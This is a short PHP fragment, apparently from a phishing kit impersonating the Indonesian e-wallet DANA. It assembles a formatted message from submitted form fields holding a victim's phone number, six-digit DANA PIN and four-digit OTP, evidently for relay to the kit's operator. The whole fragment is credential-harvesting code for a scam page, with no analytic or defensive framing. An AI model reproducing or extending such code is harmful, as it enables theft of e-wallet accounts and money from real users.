...
$message = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "%0A├───────────────────". "%0A<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor']. "%0A<b>├•𖥔 ᴘɪɴ ᴅᴀɴᴀ : </b>".  $_POST['pin1']. $_POST['pin2']. $_POST['pin3']. $_POST['pin4']. $_POST['pin5']. $_POST['pin6'].  "%0A<b>├•𖥔 ᴏᴛᴘ ᴅᴀɴᴀ : </b>".  $_POST['otp1']. $_POST['otp2']. $_POST['otp3']. $_POST['otp4']. "%0A╰───────────────────";
?>
